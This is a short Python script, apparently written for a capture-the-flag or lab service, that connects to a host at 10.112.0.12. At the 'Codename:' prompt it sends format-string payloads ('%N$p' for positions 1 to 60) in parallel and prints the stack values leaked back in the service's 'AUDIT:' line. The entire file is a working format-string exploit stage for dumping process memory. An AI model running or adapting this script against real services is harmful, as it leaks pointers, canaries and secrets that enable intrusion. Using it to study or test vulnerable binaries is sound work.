#!/usr/bin/env python3
import concurrent.futures
import re
import socket
import sys

HOST = "10.112.0.12"
PORT = int(sys.argv[1])


def recv_until(sock, marker, timeout=1.5):
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def leak(i):
    try:
        with socket.create_connection((HOST, PORT), timeout=1.5) as sock:
            recv_until(sock, b"Codename:\n")
            sock.sendall(f"%{i}$p\n".encode())
            out = recv_until(sock, b"Packet length:\n")
            match = re.search(rb"AUDIT: ([^\r\n]+)", out)
            return i, match.group(1).decode() if match else repr(out)
    except Exception as exc:
        return i, f"ERROR {exc}"

with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
    results = list(pool.map(leak, range(1, 61)))
for i, value in results:
    print(f"{i:02d}: {value}")
